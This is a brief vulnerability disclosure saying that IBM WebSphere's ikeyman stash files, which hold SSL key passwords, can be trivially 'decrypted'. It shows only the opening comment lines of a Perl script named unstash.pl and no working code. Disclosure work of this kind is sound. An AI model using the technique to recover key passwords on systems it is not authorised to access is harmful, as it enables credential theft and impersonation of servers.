IBM WebSphere ships with a tool called 'ikeyman' that encrypts server certificates/key pairs when the IBM HTTP Server and SSL connections are enabled. Ikeyman stores the password in a stash file which can be easily decrypted through the use of a freely available script

#!/usr/bin/perl -w
#
# unstash.pl - "decrypt" IBM HTTP server stash files. No, really. They
*are* this pathetic.
